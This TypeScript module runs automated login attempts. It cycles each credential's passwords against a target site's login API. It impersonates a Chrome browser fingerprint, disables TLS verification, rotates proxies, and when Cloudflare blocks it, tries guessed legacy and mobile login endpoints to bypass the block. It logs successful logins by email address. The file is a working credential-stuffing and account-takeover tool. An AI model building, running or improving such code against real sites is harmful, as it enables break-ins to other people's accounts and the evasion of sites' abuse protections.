/* eslint-disable @typescript-eslint/no-unused-vars */
import { SiteConfig, Credential, Outcome } from "./engine.js";
import { BrowserType, post } from "curl-cffi-node";

/**
 * Execute raw POST login requests bypassing the DOM using curl-impersonate.
 */
export async function executeCurlRestFlow(
  target: SiteConfig,
  credential: Credential,
  proxy: string | null
): Promise<{ outcome: Outcome; attempts: number; reason?: string; misdirection?: { url: string; trigger: string }; requeueCredential?: boolean }> {
  if (!target.apiLoginEndpoint) {
    console.error(`[CURL] No apiLoginEndpoint defined for target ${target.name}. Cannot use curl-impersonate.`);
    return { outcome: "N/A", attempts: 0 };
  }

  console.log(`[CURL] Attempting ${target.name} API login via curl-impersonate for ${credential.email}...`);
  let attempts = 0;

  for (const password of credential.passwords) {
    if (!password) continue;

    let payload: string | Record<string, string>;

    // Construct payload based on expected format
    if (target.apiPayloadFormat === "form") {
      const params = new URLSearchParams();
      params.append(target.selectors.username, credential.email);
      params.append(target.selectors.password, password);
      // Optional: Add other required form fields here if needed by the target
      payload = params.toString();
    } else {
      // Default to JSON
      payload = {
        [target.selectors.username]: credential.email,
        [target.selectors.password]: password
      };
    }

    try {
      const options: Record<string, unknown> = {
        impersonate: BrowserType.Chrome120,
        verify: false,
        timeout: 15.0,
        data: payload
      };

      if (target.apiPayloadFormat === "form") {
          options.headers = { "Content-Type": "application/x-www-form-urlencoded" };
      }

      if (proxy) {
        options.proxy = proxy.startsWith("http") ? proxy : `http://${proxy}`;
      }

      attempts++;
      const response = await post(target.apiLoginEndpoint, options);

      const status = response.status;
      const body = response.text() || "";

      // Upgrade 10: Legacy API Fuzzing if blocked (403/429)
      if (status === 403 || status === 429 || body.toLowerCase().includes("cloudflare")) {
         console.log(`[CURL] Cloudflare block on main API for ${credential.email}. Commencing Legacy API Fuzzing...`);

         const origin = new URL(target.apiLoginEndpoint).origin;
         const legacyEndpoints = target.legacyApiEndpoints && target.legacyApiEndpoints.length > 0
           ? target.legacyApiEndpoints
           : [
               `${origin}/v1/auth/mobile`,
               `${origin}/api/legacy/login`,
               `${origin}/mobile/login`,
               `${origin}/auth/v2/mobile`
             ];

         let legacySuccess = false;
         for (const legacyUrl of legacyEndpoints) {
            console.log(`[CURL] Fuzzing legacy endpoint: ${legacyUrl}`);
            try {
              const legacyRes = await post(legacyUrl, options);
              if (legacyRes.status >= 200 && legacyRes.status < 300 && (legacyRes.text() || "").toLowerCase().includes("token")) {
                console.log(`[CURL] Legacy API Fuzzing SUCCESS on ${legacyUrl} for ${credential.email}!`);
                legacySuccess = true;
                return { outcome: "inconclusive", attempts, reason: "curl-backend-missing-required-visual-and-browser-evidence" };
              }
            } catch(e) {
              // Ignore legacy failures and try the next one
            }
         }
         if (!legacySuccess) {
            if (status === 429) {
                console.log(`[CURL] Rate limited/temporarily disabled for ${credential.email}.`);
                return { outcome: "inconclusive", attempts, reason: "curl-backend-missing-required-visual-and-browser-evidence" };
            }
            console.log(`[CURL] Blocked and legacy fuzzing failed for ${credential.email}.`);
            continue;
         }
      }

      // Log success based on typical 200/201 JSON token responses or redirects
      if (status >= 200 && status < 300) {
        if (body.toLowerCase().includes("token") || body.toLowerCase().includes("success")) {
            console.log(`[CURL] Success login for ${credential.email}!`);
            return { outcome: "inconclusive", attempts, reason: "curl-backend-missing-required-visual-and-browser-evidence" };
        }
      }

      if (status === 302 || status === 301) {
          console.log(`[CURL] Success login (redirect) for ${credential.email}!`);
          return { outcome: "inconclusive", attempts, reason: "curl-backend-missing-required-visual-and-browser-evidence" };
      }

      // If unauthorized, continue to next password
      if (status === 401 || status === 403 || body.toLowerCase().includes("invalid")) {
         console.log(`[CURL] Incorrect password for ${credential.email}. Trying next...`);
         continue;
      }

    } catch (e: unknown) {
      console.error(`[CURL] Error hitting API:`, (e instanceof Error ? e.message : String(e)));
      return { outcome: "N/A", attempts };
    }
  }

  return { outcome: "inconclusive", attempts, reason: "curl-backend-missing-required-visual-and-browser-evidence" };
}